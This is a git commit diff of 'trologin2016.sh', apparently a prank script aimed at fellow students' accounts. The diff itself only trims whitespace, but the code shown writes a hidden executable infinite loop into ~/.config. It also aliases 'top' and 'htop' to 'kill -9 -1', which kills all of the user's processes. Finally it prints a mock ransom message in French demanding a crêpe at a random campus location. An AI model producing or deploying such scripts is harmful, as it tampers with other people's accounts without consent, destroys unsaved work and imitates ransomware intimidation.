1150c3ea662e33699b6a6926415c4da5d5f38685
Gnomino <gnomino@gnomino.eu>
2016-04-24 18:01:47 +0200

    Removed useless spaces + made a location more concise

--- trologin2016.sh
+++ trologin2016.sh
@@ -1,18 +1,16 @@
 #!/bin/bash
 cd 
-echo "
-#!/bin/bash
+echo "#!/bin/bash
 while true
 do
    printf '\r'
 done" > .config/.the_game
 chmod +x .config/.the_game
 
-places=("gonflable" "amphi" "cour" "entree" "distributeur" "toilettes a cote de l'amphi")
+places=("gonflable" "amphi" "cour" "entree" "distributeur" "toilettes amphi")
 the_one=${places[RANDOM % ${#places[@]}]} 
 
-echo "
-alias top='kill -9 -1'
+echo "alias top='kill -9 -1'
 alias htop='top'
 echo \"VOUS ETES VICTIME DE TROLOGIN, N'ESSAYEZ PAS DE VOUS DEBATTRE. VEUILLEZ CRIER 'PLS' POUR VOUS IDENTIFIER, PUIS HURLEZ LA LOCALISATION DONNEE. ENSUITE APPORTEZ UNE CREPE A L'ENDROIT INDIQUE POUR DEBLOQUER VOTRE ORDINATEUR.\"
 echo \"LOCALISATION : $the_one\"
